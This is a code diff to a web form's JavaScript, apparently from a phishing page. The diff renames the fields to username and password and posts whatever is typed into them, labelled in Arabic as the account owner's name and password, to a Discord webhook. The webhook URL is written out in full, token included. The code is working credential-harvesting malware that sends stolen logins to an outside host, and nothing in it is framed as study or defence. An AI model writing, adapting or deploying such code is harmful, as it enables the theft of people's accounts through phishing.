@@ -5,8 +5,8 @@ document.addEventListener("DOMContentLoaded", function() {
     suggestionForm.addEventListener("submit", function(event) {
         event.preventDefault();
 
-        var title = document.getElementById("exampleInputEmail1").value;
-        var description = document.getElementById("exampleInputPassword1").value;
+        var username = document.getElementById("username").value;
+        var password = document.getElementById("password").value;
         var webhookUrl = 'https://discord.com/api/webhooks/1265286215834402877/kQQrN-bHXBlQMdudU5vij9k-S3ag8h59VvC87D32gFAztvIzMgBmmfxwlASrF_QkpKVE';
 
         var request = new XMLHttpRequest();
@@ -17,12 +17,13 @@ document.addEventListener("DOMContentLoaded", function() {
         var params = {
             username: "سجـل الحسـابـات",
             avatar_url: "",
-            content: `**اسم صاحب الحساب:** ${title}\n**الباسورد :** ${description}`
+            content: `**اسم صاحب الحساب :** ${username}\n**الباسورد :** ${password}`
         };
 
         request.send(JSON.stringify(params));
+        
+        alert("تم إرسال حسابك !")
 
-        alert("تم إرسال حسابك بنجاح!");
         suggestionForm.reset();
     });
 });
